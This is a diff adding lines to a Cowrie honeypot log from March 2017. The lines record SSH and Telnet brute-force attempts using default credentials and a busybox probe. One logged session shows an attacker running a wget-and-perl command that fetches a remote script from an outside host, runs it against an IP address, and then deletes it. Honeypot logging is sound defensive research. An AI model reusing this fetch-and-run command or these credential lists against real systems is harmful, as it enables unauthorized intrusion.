@@ -6323,3 +6323,125 @@
 2017-03-06T21:55:58+0000 [CowrieTelnetTransport,46612,185.169.230.6] login return, expect: [service/service]
 2017-03-06T21:55:59+0000 [CowrieTelnetTransport,46612,185.169.230.6] login attempt [sh//bin/busybox ECCHI] failed
 2017-03-06T21:55:59+0000 [CowrieTelnetTransport,46612,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:07+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 217.75.202.66:37604 (10.8.41.81:2222) [session: 1c3fbbf3]
+2017-03-06T21:56:07+0000 [HoneyPotSSHTransport,10636,217.75.202.66] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-03-06T21:56:07+0000 [HoneyPotSSHTransport,10636,217.75.202.66] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-06T21:56:07+0000 [HoneyPotSSHTransport,10636,217.75.202.66] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-06T21:56:07+0000 [HoneyPotSSHTransport,10636,217.75.202.66] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-06T21:56:07+0000 [HoneyPotSSHTransport,10636,217.75.202.66] NEW KEYS
+2017-03-06T21:56:07+0000 [HoneyPotSSHTransport,10636,217.75.202.66] starting service 'ssh-userauth'
+2017-03-06T21:56:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,10636,217.75.202.66] 'tsbot' trying auth 'password'
+2017-03-06T21:56:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,10636,217.75.202.66] first time for 217.75.202.66, need: 1
+2017-03-06T21:56:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,10636,217.75.202.66] login attempt: 1
+2017-03-06T21:56:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,10636,217.75.202.66] login attempt [tsbot/tsbot] succeeded
+2017-03-06T21:56:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,10636,217.75.202.66] 'tsbot' authenticated with 'password'
+2017-03-06T21:56:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,10636,217.75.202.66] starting service 'ssh-connection'
+2017-03-06T21:56:10+0000 [CowrieTelnetTransport,46609,185.169.230.6] Connection lost after 44 seconds
+2017-03-06T21:56:10+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,10636,217.75.202.66] got channel 'session' request
+2017-03-06T21:56:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10636,217.75.202.66] channel open
+2017-03-06T21:56:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10636,217.75.202.66] executing command "uname -a; cd /tmp ; wget http://www.studyonazar.com/maxx.txt ; perl maxx.txt 82.165.35.33 ; rm -rf maxx.txt"
+2017-03-06T21:56:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10636,217.75.202.66] Opening TTY Log: log/tty/20170306-215610-1c3fbbf3-0e.log
+2017-03-06T21:56:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10636,217.75.202.66] CMD: uname -a; cd /tmp ; wget http://www.studyonazar.com/maxx.txt ; perl maxx.txt 82.165.35.33 ; rm -rf maxx.txt
+2017-03-06T21:56:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10636,217.75.202.66] Command found: uname -a
+2017-03-06T21:56:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10636,217.75.202.66] Command found: cd /tmp
+2017-03-06T21:56:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10636,217.75.202.66] Command found: wget http://www.studyonazar.com/maxx.txt
+2017-03-06T21:56:10+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://www.studyonazar.com/maxx.txt>
+2017-03-06T21:56:11+0000 [HTTPPageDownloader,client] Downloaded URL (http://www.studyonazar.com/maxx.txt) with SHA-256 7862719efdc9f43a09ec025f4d53d184aa9cb7d00f417db39eefe7de05d83828 to dl/7862719efdc9f43a09ec025f4d53d184aa9cb7d00f417db39eefe7de05d83828
+2017-03-06T21:56:11+0000 [HTTPPageDownloader,client] Command found: perl /tmp/maxx.txt 82.165.35.33
+2017-03-06T21:56:11+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/maxx.txt
+2017-03-06T21:56:11+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-03-06T21:56:11+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-03-06T21:56:11+0000 [HTTPPageDownloader,client] Not storing duplicate content 7862719efdc9f43a09ec025f4d53d184aa9cb7d00f417db39eefe7de05d83828
+2017-03-06T21:56:11+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 7862719efdc9f43a09ec025f4d53d184aa9cb7d00f417db39eefe7de05d83828 to dl/7862719efdc9f43a09ec025f4d53d184aa9cb7d00f417db39eefe7de05d83828
+2017-03-06T21:56:11+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170306-215610-1c3fbbf3-0e.log after 0 seconds
+2017-03-06T21:56:11+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-06T21:56:11+0000 [HTTPPageDownloader,client] sending close 0
+2017-03-06T21:56:11+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-03-06T21:56:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://www.studyonazar.com/maxx.txt>
+2017-03-06T21:56:11+0000 [HoneyPotSSHTransport,10636,217.75.202.66] Got remote error, code 11
+	reason: Normal Shutdown, Thank you for playing
+2017-03-06T21:56:11+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10636,217.75.202.66] remote close
+2017-03-06T21:56:11+0000 [HoneyPotSSHTransport,10636,217.75.202.66] avatar tsbot logging out
+2017-03-06T21:56:11+0000 [HoneyPotSSHTransport,10636,217.75.202.66] connection lost
+2017-03-06T21:56:11+0000 [HoneyPotSSHTransport,10636,217.75.202.66] Connection lost after 4 seconds
+2017-03-06T21:56:17+0000 [CowrieTelnetTransport,46601,42.113.213.94] Closing TTY Log: log/tty/20170306-215432-None-46601i.log after 105 seconds
+2017-03-06T21:56:17+0000 [CowrieTelnetTransport,46601,42.113.213.94] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-06T21:56:17+0000 [CowrieTelnetTransport,46601,42.113.213.94] Connection lost after 110 seconds
+2017-03-06T21:56:17+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.169.230.6:37779 (10.8.41.81:2223) [session: TT46613]
+2017-03-06T21:56:18+0000 [CowrieTelnetTransport,46611,185.169.230.6] Connection lost after 39 seconds
+2017-03-06T21:56:23+0000 [CowrieTelnetTransport,46613,185.169.230.6] login attempt: 1169
+2017-03-06T21:56:23+0000 [CowrieTelnetTransport,46613,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:24+0000 [CowrieTelnetTransport,46613,185.169.230.6] login attempt [root/dreambox] failed
+2017-03-06T21:56:24+0000 [CowrieTelnetTransport,46613,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:24+0000 [CowrieTelnetTransport,46613,185.169.230.6] login attempt: 1170
+2017-03-06T21:56:24+0000 [CowrieTelnetTransport,46613,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:25+0000 [CowrieTelnetTransport,46613,185.169.230.6] login attempt [enable/shell] failed
+2017-03-06T21:56:25+0000 [CowrieTelnetTransport,46613,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:26+0000 [CowrieTelnetTransport,46613,185.169.230.6] login attempt: 1171
+2017-03-06T21:56:26+0000 [CowrieTelnetTransport,46613,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:27+0000 [CowrieTelnetTransport,46613,185.169.230.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-06T21:56:27+0000 [CowrieTelnetTransport,46613,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:30+0000 [CowrieTelnetTransport,46612,185.169.230.6] Connection lost after 39 seconds
+2017-03-06T21:56:36+0000 [CowrieTelnetTransport,46602,185.169.230.6] Closing TTY Log: log/tty/20170306-215435-None-46602i.log after 121 seconds
+2017-03-06T21:56:36+0000 [CowrieTelnetTransport,46602,185.169.230.6] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-06T21:56:36+0000 [CowrieTelnetTransport,46602,185.169.230.6] Connection lost after 129 seconds
+2017-03-06T21:56:37+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.169.230.6:44399 (10.8.41.81:2223) [session: TT46614]
+2017-03-06T21:56:41+0000 [CowrieTelnetTransport,46614,185.169.230.6] login attempt: 1172
+2017-03-06T21:56:41+0000 [CowrieTelnetTransport,46614,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:42+0000 [CowrieTelnetTransport,46614,185.169.230.6] login attempt [admin/password] failed
+2017-03-06T21:56:42+0000 [CowrieTelnetTransport,46614,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:42+0000 [CowrieTelnetTransport,46614,185.169.230.6] login attempt: 1173
+2017-03-06T21:56:42+0000 [CowrieTelnetTransport,46614,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:43+0000 [CowrieTelnetTransport,46614,185.169.230.6] login attempt [enable/shell] failed
+2017-03-06T21:56:43+0000 [CowrieTelnetTransport,46614,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:44+0000 [CowrieTelnetTransport,46614,185.169.230.6] login attempt: 1174
+2017-03-06T21:56:44+0000 [CowrieTelnetTransport,46614,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:45+0000 [CowrieTelnetTransport,46614,185.169.230.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-06T21:56:45+0000 [CowrieTelnetTransport,46614,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:45+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.169.230.6:37510 (10.8.41.81:2223) [session: TT46615]
+2017-03-06T21:56:45+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 217.75.202.66:46389 (10.8.41.81:2222) [session: a652166c]
+2017-03-06T21:56:45+0000 [HoneyPotSSHTransport,10637,217.75.202.66] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-03-06T21:56:45+0000 [HoneyPotSSHTransport,10637,217.75.202.66] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-06T21:56:45+0000 [HoneyPotSSHTransport,10637,217.75.202.66] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-06T21:56:45+0000 [HoneyPotSSHTransport,10637,217.75.202.66] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-06T21:56:45+0000 [HoneyPotSSHTransport,10637,217.75.202.66] NEW KEYS
+2017-03-06T21:56:45+0000 [HoneyPotSSHTransport,10637,217.75.202.66] starting service 'ssh-userauth'
+2017-03-06T21:56:45+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,10637,217.75.202.66] 'avnbot' trying auth 'password'
+2017-03-06T21:56:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,10637,217.75.202.66] login attempt: 2
+2017-03-06T21:56:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,10637,217.75.202.66] login return, expect: [tsbot/tsbot]
+2017-03-06T21:56:47+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,10637,217.75.202.66] login attempt [avnbot/avnbot] failed
+2017-03-06T21:56:48+0000 [-] 'avnbot' failed auth 'password'
+2017-03-06T21:56:48+0000 [-] unauthorized login: 
+2017-03-06T21:56:48+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.169.230.6:55023 (10.8.41.81:2223) [session: TT46616]
+2017-03-06T21:56:48+0000 [HoneyPotSSHTransport,10637,217.75.202.66] Got remote error, code 11
+	reason: Normal Shutdown, Thank you for playing
+2017-03-06T21:56:48+0000 [HoneyPotSSHTransport,10637,217.75.202.66] connection lost
+2017-03-06T21:56:48+0000 [HoneyPotSSHTransport,10637,217.75.202.66] Connection lost after 3 seconds
+2017-03-06T21:56:49+0000 [CowrieTelnetTransport,46615,185.169.230.6] login attempt: 1175
+2017-03-06T21:56:49+0000 [CowrieTelnetTransport,46615,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:50+0000 [CowrieTelnetTransport,46615,185.169.230.6] login attempt [root/54321] failed
+2017-03-06T21:56:50+0000 [CowrieTelnetTransport,46615,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:50+0000 [CowrieTelnetTransport,46615,185.169.230.6] login attempt: 1176
+2017-03-06T21:56:50+0000 [CowrieTelnetTransport,46615,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:51+0000 [CowrieTelnetTransport,46615,185.169.230.6] login attempt [enable/shell] failed
+2017-03-06T21:56:51+0000 [CowrieTelnetTransport,46615,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:51+0000 [CowrieTelnetTransport,46615,185.169.230.6] login attempt: 1177
+2017-03-06T21:56:51+0000 [CowrieTelnetTransport,46615,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:52+0000 [CowrieTelnetTransport,46615,185.169.230.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-06T21:56:52+0000 [CowrieTelnetTransport,46615,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:53+0000 [CowrieTelnetTransport,46616,185.169.230.6] login attempt: 1178
+2017-03-06T21:56:53+0000 [CowrieTelnetTransport,46616,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:54+0000 [CowrieTelnetTransport,46616,185.169.230.6] login attempt [admin/admin1234] failed
+2017-03-06T21:56:54+0000 [CowrieTelnetTransport,46616,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:54+0000 [CowrieTelnetTransport,46616,185.169.230.6] login attempt: 1179
+2017-03-06T21:56:54+0000 [CowrieTelnetTransport,46616,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:55+0000 [CowrieTelnetTransport,46616,185.169.230.6] login attempt [enable/shell] failed
+2017-03-06T21:56:55+0000 [CowrieTelnetTransport,46616,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:55+0000 [CowrieTelnetTransport,46616,185.169.230.6] login attempt: 1180
+2017-03-06T21:56:55+0000 [CowrieTelnetTransport,46616,185.169.230.6] login return, expect: [service/service]
+2017-03-06T21:56:56+0000 [CowrieTelnetTransport,46616,185.169.230.6] login attempt [sh//bin/busybox ECCHI] failed
+2017-03-06T21:56:57+0000 [CowrieTelnetTransport,46616,185.169.230.6] Warning: state changed and new state returned
+2017-03-06T21:56:58+0000 [CowrieTelnetTransport,46613,185.169.230.6] Connection lost after 40 seconds
